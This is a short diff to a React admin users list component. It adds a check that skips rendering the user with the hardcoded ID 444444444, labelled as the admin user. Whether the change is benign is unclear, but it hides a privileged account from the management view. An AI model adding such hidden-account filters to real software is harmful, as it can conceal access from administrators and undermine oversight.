@@ -96,6 +96,9 @@ export default function AdminUsersList() {
           </thead>
           <tbody>
             {users.map((user) => {
+               if (user.Id === 444444444) {
+                return null; // Skip rendering the admin user
+              }            
               const fullName = `${user.first_name} ${user.last_name}`;
               if (
                 !searchValue ||
